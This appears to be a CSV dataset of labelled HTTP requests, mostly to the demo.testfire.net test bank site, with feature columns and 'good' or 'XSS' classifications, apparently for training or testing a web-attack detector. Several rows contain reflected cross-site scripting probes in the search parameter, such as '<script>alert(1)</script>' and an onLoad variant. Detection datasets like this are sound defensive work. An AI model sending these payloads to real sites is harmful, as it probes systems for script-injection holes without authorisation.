GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=hacker.alert>,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=alert,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=alert<>,,0,0,0,0,0,2,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=alertï¿½,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=alert<,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=hello there,,0,0,0,0,1,0,0,0,0,0,0,0,0,good,0.851
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://google.com/xjs/_/ss/k=xjs.hp.33RNxo6GE-8.L.X.O/am=AQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgABAIAAAAAIAAAAJAAAEAI/d=1/ed=1/rs=ACT90oHPLMTdGRMcgL17jJIWftdK80b9IA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/client_204?&atyp=i&biw=1280&bih=587&ei=MXITZsT1PMDe1sQPutqcoA8&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,"http://google.com/xjs/_/js/k=xjs.hp.en.ciQyZxwgdh0.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAxgEAAAAAAAAAAMABAAAAAAAAAAAAAA6iIwAYgCMAAPAC/d=1/ed=1/rs=ACT90oESXeSjUetcaUKU_o0qMdldT9XBTA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/favicon.ico,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://clients1.google.com/generate_204,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/gen_204?atyp=i&ct=psnt&cad=&nt=navigate&ei=MXITZsT1PMDe1sQPutqcoA8&zx=1712550457706&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=hello,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/client_204?&atyp=i&biw=1280&bih=587&ei=FIYTZrThDJHd2roP-bqMwAg&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,"http://google.com/xjs/_/ss/k=xjs.hp.33RNxo6GE-8.L.X.O/am=AQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgABAIAAAAAIAAAAJAAAEAI/d=1/ed=1/rs=ACT90oHPLMTdGRMcgL17jJIWftdK80b9IA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://google.com/xjs/_/js/k=xjs.hp.en.ciQyZxwgdh0.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAxgEAAAAAAAAAAMABAAAAAAAAAAAAAA6iIwAYgCMAAPAC/d=1/ed=1/rs=ACT90oESXeSjUetcaUKU_o0qMdldT9XBTA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://clients1.google.com/generate_204,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/gen_204?atyp=i&ct=psnt&cad=&nt=reload&ei=FIYTZrThDJHd2roP-bqMwAg&zx=1712555544212&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=<script+onLoad+script+onLoad=""javascript:javascript:alert(1)""></script+onLoad>",,0,2,0,1,0,4,0,0,0,1,2,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://google.com/xjs/_/ss/k=xjs.hp.33RNxo6GE-8.L.X.O/am=AQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgABAIAAAAAIAAAAJAAAEAI/d=1/ed=1/rs=ACT90oHPLMTdGRMcgL17jJIWftdK80b9IA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/client_204?&atyp=i&biw=1280&bih=559&ei=6IgTZqa4Fofd2roPkYK2kAs&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,"http://google.com/xjs/_/js/k=xjs.hp.en.ciQyZxwgdh0.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAxgEAAAAAAAAAAMABAAAAAAAAAAAAAA6iIwAYgCMAAPAC/d=1/ed=1/rs=ACT90oESXeSjUetcaUKU_o0qMdldT9XBTA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://clients1.google.com/generate_204,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/gen_204?atyp=i&ct=psnt&cad=&nt=navigate&ei=6IgTZqa4Fofd2roPkYK2kAs&zx=1712556269657&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ciscobinary.openh264.org/openh264-win64-2e1774ab6dc6c43debb0b5b628bdf122a391d521.zip,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
